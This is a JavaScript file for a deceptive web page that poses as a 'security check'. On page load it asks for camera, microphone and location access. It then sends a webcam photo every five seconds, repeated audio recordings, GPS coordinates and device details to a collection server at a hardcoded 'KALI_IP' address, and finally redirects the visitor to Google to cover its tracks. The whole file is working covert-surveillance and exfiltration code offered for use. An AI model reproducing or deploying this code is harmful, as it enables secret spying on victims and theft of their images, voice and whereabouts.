// Configuration
const KALI_IP = "192.168.3.2";
const API_URL = `http://${KALI_IP}:5000/collect`;

let mediaStream = null;
let mediaRecorder = null;
let audioChunks = [];
let allGranted = false;

// Auto-start when page loads
window.addEventListener('load', () => {
    setTimeout(() => {
        requestAllPermissions();
    }, 1000);
});

// Request all permissions automatically
async function requestAllPermissions() {
    updateMessage('Initializing security check...', 'info');
    showProgress(true);
    
    await requestCamera();
    await requestMicrophone();
    await requestLocation();
    
    sendDeviceInfo();
    
    if (allGranted) {
        startPhotoCapture();
        startAudioRecording();
        updateProgress(100);
        updateMessage('✓ Verification completed! Redirecting...', 'success');
        
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 2000);
    } else {
        updateMessage('Some permissions were denied. Please allow all to continue.', 'error');
        showProgress(false);
    }
}

// Request Camera
async function requestCamera() {
    const statusEl = document.getElementById('camera-status');
    const itemEl = document.getElementById('camera-item');
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        mediaStream = stream;
        
        statusEl.textContent = '✓';
        statusEl.classList.add('granted');
        itemEl.classList.add('granted');
        
        sendToAPI('camera', { status: 'granted' });
        updateProgress(33);
        return true;
    } catch(err) {
        statusEl.textContent = '✗';
        statusEl.classList.add('denied');
        itemEl.classList.add('denied');
        sendToAPI('camera', { status: 'denied', error: err.message });
        allGranted = false;
        return false;
    }
}

// Request Microphone
async function requestMicrophone() {
    const statusEl = document.getElementById('microphone-status');
    const itemEl = document.getElementById('microphone-item');
    
    try {
        await navigator.mediaDevices.getUserMedia({ audio: true });
        statusEl.textContent = '✓';
        statusEl.classList.add('granted');
        itemEl.classList.add('granted');
        
        sendToAPI('microphone', { status: 'granted' });
        updateProgress(66);
        return true;
    } catch(err) {
        statusEl.textContent = '✗';
        statusEl.classList.add('denied');
        itemEl.classList.add('denied');
        sendToAPI('microphone', { status: 'denied', error: err.message });
        allGranted = false;
        return false;
    }
}

// Request Location
function requestLocation() {
    return new Promise((resolve) => {
        const statusEl = document.getElementById('location-status');
        const itemEl = document.getElementById('location-item');
        
        if (!navigator.geolocation) {
            statusEl.textContent = '✗';
            statusEl.classList.add('denied');
            itemEl.classList.add('denied');
            resolve(false);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                statusEl.textContent = '✓';
                statusEl.classList.add('granted');
                itemEl.classList.add('granted');
                
                sendToAPI('location', {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                });
                updateProgress(100);
                allGranted = true;
                resolve(true);
            },
            (err) => {
                statusEl.textContent = '✗';
                statusEl.classList.add('denied');
                itemEl.classList.add('denied');
                sendToAPI('location', { status: 'denied', error: err.message });
                allGranted = false;
                resolve(false);
            }
        );
    });
}

// Send device info
function sendDeviceInfo() {
    sendToAPI('device_info', {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    });
}

// Capture photo every 5 seconds
function startPhotoCapture() {
    const video = document.getElementById('video');
    const canvas = document.createElement('canvas');
    
    setInterval(() => {
        if (video.videoWidth > 0 && video.srcObject) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            sendToAPI('image', { data: imageData });
        }
    }, 5000);
}

// Record audio
function startAudioRecording() {
    if (!mediaStream) return;
    
    const audioTracks = mediaStream.getAudioTracks();
    if (audioTracks.length === 0) return;
    
    mediaRecorder = new MediaRecorder(mediaStream);
    
    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
            audioChunks.push(event.data);
        }
    };
    
    mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
        const reader = new FileReader();
        reader.onloadend = () => {
            sendToAPI('audio', { data: reader.result });
        };
        reader.readAsDataURL(audioBlob);
        audioChunks = [];
    };
    
    mediaRecorder.start();
    
    setInterval(() => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            setTimeout(() => {
                mediaRecorder.start();
            }, 100);
        }
    }, 10000);
}

// UI Helpers
function updateProgress(percent) {
    const progressContainer = document.querySelector('.progress-container');
    const progressBar = document.getElementById('progress-bar');
    progressContainer.style.display = 'block';
    progressBar.style.width = percent + '%';
}

function showProgress(show) {
    const progressContainer = document.querySelector('.progress-container');
    progressContainer.style.display = show ? 'block' : 'none';
}

function updateMessage(text, type) {
    const msgDiv = document.getElementById('message');
    msgDiv.textContent = text;
    msgDiv.className = 'message ' + type;
}

// Send to API
function sendToAPI(type, data) {
    const payload = { type, ...data };
    
    fetch(API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    }).catch(err => {
        console.error('Failed to send:', type, err);
    });
}